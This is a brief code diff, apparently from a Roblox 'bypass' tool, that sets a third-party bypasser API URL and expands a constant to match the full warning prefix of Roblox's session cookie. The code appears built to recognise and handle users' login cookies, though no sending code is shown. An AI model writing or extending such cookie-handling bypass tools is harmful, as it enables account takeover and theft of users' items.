@@ -10,7 +10,7 @@ const RATE_LIMIT_KEY = "bypass_attempts";
 const MAX_ATTEMPTS_PER_MIN = 10;
 const BYPASS_API_URL = "https://Rblxbypasser.com";
 const BYPASS_DURATION_MS = 60_000;
-const COOKIE_PREFIX = "_|WARNING:";
+const COOKIE_PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
 
 type BypassStatus = "idle" | "loading" | "success" | "error";
 
